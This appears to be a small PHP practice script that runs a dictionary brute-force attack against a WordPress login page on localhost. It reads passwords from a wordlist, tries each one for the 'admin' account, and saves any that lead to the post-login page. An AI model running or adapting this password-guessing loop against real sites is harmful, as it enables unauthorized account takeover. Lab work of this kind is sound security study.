<?php
require 'get_web_page.php';

$username = "admin";
$password = "password";

$url = 'http://localhost:8888/wp-login.php';

echo "\n";


$fileHere = fopen("smallList.txt", "r") or die ("Cant open file!");
while(!feof($fileHere)){
    echo "----------------------------------\n";
    echo "New one                           \n";
    echo "----------------------------------\n";
    $password = fgets($fileHere);
    echo "The current password we are trying is ... " . $password;
    echo "\n";
    $resultFromCurl = get_web_page( $url, $username, $password);
    //this confirmed we are now returning a result each time
    //print_r($resultFromCurl['content']);
/*
    $needle = "Lost";
    $checker = strpos($resultFromCurl['content'], $needle);

    //if checker is true, which means the word $needle is there
    if($checker !== false){
        echo "The value of checker is " . $checker . "\n";
    }
    //if checker is false
    else{
        echo "Checker is false and it looks like this: " . $checker ."\n";
    }

    */
    $needle = "Welcome to WordPress";
    $needle = "This is your first post.";
    $checker = strpos($resultFromCurl['content'], $needle);
    //$checker = true;

    if($checker){
        file_put_contents("passwordsThatWorked.txt", $password, FILE_APPEND);
    }
    

}
echo "\n";
fclose($fileHere);
